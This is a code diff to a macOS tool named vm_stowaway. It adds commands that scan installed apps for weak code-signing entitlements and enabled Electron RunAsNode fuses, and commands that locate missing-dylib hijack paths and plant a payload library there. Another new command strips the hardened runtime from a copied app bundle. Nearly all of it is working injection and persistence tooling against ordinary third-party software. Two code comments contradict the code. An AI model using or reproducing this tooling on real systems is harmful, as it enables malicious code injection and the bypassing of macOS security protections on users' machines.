@@ -1,6 +1,7 @@
 #include "../include/vm_stowaway.h"
 
 #include <ctype.h>
+#include <dirent.h>
 #include <dlfcn.h>
 #include <errno.h>
 #include <inttypes.h>
@@ -11,6 +12,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <strings.h>
+#include <sys/stat.h>
 #include <sys/wait.h>
 #include <unistd.h>
 
@@ -922,6 +924,229 @@ static int cmd_attach(int argc, char **argv) {
     return 0;
 }
 
+/* Pipe `codesign -d --entitlements - <path>` and check for flags. Returns 1
+ * if both --no-library-validation-friendly bits are set. */
+static int check_entitlements(const char *bin, int *allow_dyld, int *no_libval) {
+    *allow_dyld = 0;
+    *no_libval = 0;
+    /* shell-quote: wrap in single quotes, escape embedded quotes. */
+    char q[2048];
+    size_t qn = 0;
+    q[qn++] = '\'';
+    for (const char *p = bin; *p && qn + 5 < sizeof(q); p++) {
+        if (*p == '\'') { q[qn++]='\''; q[qn++]='\\'; q[qn++]='\''; q[qn++]='\''; }
+        else q[qn++] = *p;
+    }
+    q[qn++] = '\''; q[qn] = 0;
+    char cmd[2200];
+    snprintf(cmd, sizeof(cmd),
+             "codesign -d --entitlements - %s 2>/dev/null", q);
+    FILE *fp = popen(cmd, "r");
+    if (!fp) return -1;
+    char buf[8192];
+    size_t got = fread(buf, 1, sizeof(buf) - 1, fp);
+    buf[got] = 0;
+    pclose(fp);
+    if (strstr(buf, "com.apple.security.cs.allow-dyld-environment-variables"))
+        *allow_dyld = 1;
+    if (strstr(buf, "com.apple.security.cs.disable-library-validation"))
+        *no_libval = 1;
+    return 0;
+}
+
+/* Recursively walk /Applications looking for .app bundles, check the main
+ * executable's entitlements, print matches. */
+static void scan_apps_at(const char *dir, int depth) {
+    if (depth > 4) return;
+    DIR *d = opendir(dir);
+    if (!d) return;
+    struct dirent *e;
+    while ((e = readdir(d))) {
+        if (e->d_name[0] == '.') continue;
+        char path[1024];
+        snprintf(path, sizeof(path), "%s/%s", dir, e->d_name);
+        size_t nlen = strlen(e->d_name);
+        if (nlen > 4 && strcmp(e->d_name + nlen - 4, ".app") == 0) {
+            /* find Contents/MacOS/<exe> */
+            char macos[1280];
+            snprintf(macos, sizeof(macos), "%s/Contents/MacOS", path);
+            DIR *m = opendir(macos);
+            if (!m) continue;
+            struct dirent *me;
+            while ((me = readdir(m))) {
+                if (me->d_name[0] == '.') continue;
+                char exe[2048];
+                snprintf(exe, sizeof(exe), "%s/%s", macos, me->d_name);
+                int ad = 0, nv = 0;
+                if (check_entitlements(exe, &ad, &nv) == 0 && ad && nv) {
+                    printf("%s  (dyld-env + no-libval)\n", path);
+                }
+                break;  /* only check first MacOS binary */
+            }
+            closedir(m);
+        } else {
+            struct stat st;
+            if (stat(path, &st) == 0 && S_ISDIR(st.st_mode))
+                scan_apps_at(path, depth + 1);
+        }
+    }
+    closedir(d);
+}
+
+/* Look for `Electron Framework.framework` inside an .app to detect Electron.
+ * If found, sniff the framework binary for fuse bytes (4-byte sentinel
+ * 0x59,0x4D,0x44,0x70 followed by N bool bytes; index 0 = RunAsNode, index 1
+ * = CookieEncryption, index 2 = NodeOptions, ... -- we only print RunAsNode). */
+static int is_electron(const char *app, char *fw_out, size_t flen) {
+    char fw[1024];
+    snprintf(fw, sizeof(fw), "%s/Contents/Frameworks/Electron Framework.framework/Electron Framework", app);
+    if (access(fw, F_OK) != 0) return 0;
+    if (fw_out) snprintf(fw_out, flen, "%s", fw);
+    return 1;
+}
+
+static int electron_run_as_node(const char *fw_bin) {
+    /* @electron/fuses v1 sentinel: 32 ASCII bytes, then version u8, then fuse
+     * bytes (0=removed, 1=disabled, 2=enabled). Index 0 = RunAsNode. */
+    static const char SENT[] = "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX";
+    const size_t slen = sizeof(SENT) - 1;
+    FILE *f = fopen(fw_bin, "rb");
+    if (!f) return -1;
+    fseek(f, 0, SEEK_END);
+    long sz = ftell(f);
+    if (sz <= 0 || sz > (long)(500 * 1024 * 1024)) { fclose(f); return -1; }
+    rewind(f);
+    uint8_t *buf = malloc(sz);
+    if (!buf) { fclose(f); return -1; }
+    long got = (long)fread(buf, 1, sz, f);
+    fclose(f);
+    int result = -1;
+    for (long i = 0; i + (long)slen + 8 <= got; i++) {
+        if (memcmp(buf + i, SENT, slen) == 0) {
+            /* skip version byte (buf[i+slen]) */
+            uint8_t run_as_node = buf[i + slen + 1];
+            result = (run_as_node == 2) ? 1 : 0;
+            break;
+        }
+    }
+    free(buf);
+    return result;
+}
+
+static int cmd_scan_electron(int argc, char **argv) {
+    const char *root = argc >= 1 ? argv[0] : "/Applications";
+    DIR *d = opendir(root);
+    if (!d) die("opendir(%s): %s", root, strerror(errno));
+    struct dirent *e;
+    while ((e = readdir(d))) {
+        if (e->d_name[0] == '.') continue;
+        size_t nlen = strlen(e->d_name);
+        if (nlen < 4 || strcmp(e->d_name + nlen - 4, ".app") != 0) continue;
+        char app[1024];
+        snprintf(app, sizeof(app), "%s/%s", root, e->d_name);
+        char fw[1024];
+        if (!is_electron(app, fw, sizeof(fw))) continue;
+        int ran = electron_run_as_node(fw);
+        printf("%s  electron  RUN_AS_NODE=%s\n",
+               app,
+               ran == 1 ? "enabled" :
+               ran == 0 ? "disabled" : "unknown");
+    }
+    closedir(d);
+    return 0;
+}
+
+static int cmd_scan_targets(int argc, char **argv) {
+    const char *root = argc >= 1 ? argv[0] : "/Applications";
+    info("scanning %s for hardened-but-permissive apps...", root);
+    scan_apps_at(root, 0);
+    return 0;
+}
+
+static int cmd_scan_hijacks(int argc, char **argv) {
+    if (argc < 1) die("usage: vm_stowaway scan-hijacks <bin>");
+    char err[512] = {0};
+    vm_stowaway_hijack_t buf[64];
+    ssize_t n = vm_stowaway_scan_hijacks(argv[0], buf, 64, err, sizeof(err));
+    if (n < 0) die("scan-hijacks: %s", err);
+    if (n == 0) { info("no candidates"); return 0; }
+    for (ssize_t i = 0; i < n && i < 64; i++) {
+        printf("%s  (%s) %s\n",
+               buf[i].path,
+               buf[i].weak ? "weak-missing" : "rpath-missing",
+               buf[i].dep_name);
+    }
+    if (n > 64) info("... (%zd total, showing 64)", n);
+    return 0;
+}
+
+/* Locate libvm_stowaway_payload.dylib next to us / build/ / /usr/local/lib. */
+static int default_payload_path(char *out, size_t outlen) {
+    Dl_info info;
+    if (dladdr((void *)default_payload_path, &info) && info.dli_fname) {
+        char buf[1024];
+        snprintf(buf, sizeof(buf), "%s", info.dli_fname);
+        char *dir = dirname(buf);
+        if (dir) {
+            snprintf(out, outlen, "%s/libvm_stowaway_payload.dylib", dir);
+            if (access(out, R_OK) == 0) return 0;
+            snprintf(out, outlen, "%s/../libvm_stowaway_payload.dylib", dir);
+            if (access(out, R_OK) == 0) return 0;
+        }
+    }
+    snprintf(out, outlen, "/usr/local/lib/libvm_stowaway_payload.dylib");
+    return access(out, R_OK) == 0 ? 0 : -1;
+}
+
+static int cmd_hijack(int argc, char **argv) {
+    if (argc < 1)
+        die("usage: vm_stowaway hijack <bin> [--pick N] [--payload PATH] [--dry-run]");
+    const char *bin = argv[0];
+    int pick = 0, dry = 0;
+    const char *payload = NULL;
+    for (int i = 1; i < argc; i++) {
+        if (!strcmp(argv[i], "--pick") && i + 1 < argc) pick = atoi(argv[++i]);
+        else if (!strcmp(argv[i], "--payload") && i + 1 < argc) payload = argv[++i];
+        else if (!strcmp(argv[i], "--dry-run")) dry = 1;
+        else die("unknown flag: %s", argv[i]);
+    }
+    char err[512] = {0};
+    vm_stowaway_hijack_t buf[64];
+    ssize_t n = vm_stowaway_scan_hijacks(bin, buf, 64, err, sizeof(err));
+    if (n < 0) die("scan-hijacks: %s", err);
+    if (n == 0) die("no hijack candidates");
+    if (pick < 0 || pick >= n || pick >= 64) die("pick out of range (0..%zd)", n - 1);
+
+    info("target: %s (%s) %s", buf[pick].path,
+         buf[pick].weak ? "weak-missing" : "rpath-missing", buf[pick].dep_name);
+    if (dry) return 0;
+
+    char pp[1024];
+    if (payload) snprintf(pp, sizeof(pp), "%s", payload);
+    else if (default_payload_path(pp, sizeof(pp)) < 0)
+        die("couldn't find payload; pass --payload PATH");
+
+    if (vm_stowaway_hijack_drop(pp, buf[pick].path, err, sizeof(err)) < 0)
+        die("drop: %s", err);
+    ok("dropped %s -> %s", pp, buf[pick].path);
+    return 0;
+}
+
+/* forward decl */
+static int copy_and_unharden(const char *src_app, const char *dst_app,
+                             char *errbuf, size_t errlen);
+
+static int cmd_unharden(int argc, char **argv) {
+    if (argc < 2)
+        die("usage: vm_stowaway unharden <src.app> <dst.app>\n"
+            "       (copy + ad-hoc resign without hardened runtime / library validation)");
+    char err[256] = {0};
+    if (copy_and_unharden(argv[0], argv[1], err, sizeof(err)) < 0)
+        die("unharden: %s", err);
+    ok("%s ready (hardened runtime stripped)", argv[1]);
+    return 0;
+}
+
 static int cmd_unpatch(int argc, char **argv) {
     if (argc < 2)
         die("usage: vm_stowaway unpatch <bin> <name-substr> [--out PATH] [--no-sign]");
@@ -955,6 +1180,19 @@ static void usage(void) {
         "            add LC_LOAD_DYLIB to bin\n"
         "  unpatch <bin> <name-substr> [--out PATH] [--no-sign]\n"
         "            strip LC_LOAD_DYLIBs whose name contains substr\n"
+        "  unharden <src.app> <dst.app>\n"
+        "            copy the bundle and ad-hoc resign without hardened runtime/library validation\n"
+        "            (afterwards plain `launch` works against it)\n"
+        "  scan-hijacks <bin>\n"
+        "            list paths where dropping a dylib would be loaded as a missing dep\n"
+        "  hijack  <bin> [--pick N] [--payload PATH] [--dry-run]\n"
+        "            drop the payload at the first (or Nth) hijack candidate\n"
+        "  scan-targets [dir]\n"
+        "            walk /Applications (or dir) for hardened apps shipping with\n"
+        "            disable-library-validation + allow-dyld-environment-variables\n"
+        "            (i.e. ones where plain `launch` works against hardened runtime)\n"
+        "  scan-electron [dir]\n"
+        "            list Electron apps and their ELECTRON_RUN_AS_NODE fuse state\n"
         "  wrap    --pid PID [--sock PATH] [--shim PATH] [--copy DEST.app] -- <tool> [args...]\n"
         "            launch <tool> with the mach shim DYLD_INSERTed\n"
         "  attach  <target> [--sock PATH | --name N]\n"
@@ -982,6 +1220,11 @@ int main(int argc, char **argv) {
     if (!strcmp(cmd, "launch"))   return cmd_launch(sub_argc, sub_argv);
     if (!strcmp(cmd, "patch"))    return cmd_patch(sub_argc, sub_argv);
     if (!strcmp(cmd, "unpatch"))  return cmd_unpatch(sub_argc, sub_argv);
+    if (!strcmp(cmd, "unharden")) return cmd_unharden(sub_argc, sub_argv);
+    if (!strcmp(cmd, "scan-hijacks")) return cmd_scan_hijacks(sub_argc, sub_argv);
+    if (!strcmp(cmd, "scan-targets")) return cmd_scan_targets(sub_argc, sub_argv);
+    if (!strcmp(cmd, "scan-electron")) return cmd_scan_electron(sub_argc, sub_argv);
+    if (!strcmp(cmd, "hijack"))   return cmd_hijack(sub_argc, sub_argv);
     if (!strcmp(cmd, "wrap"))     return cmd_wrap(sub_argc, sub_argv);
     if (!strcmp(cmd, "attach"))   return cmd_attach(sub_argc, sub_argv);
     if (!strcmp(cmd, "read"))     return cmd_read(sub_argc, sub_argv);
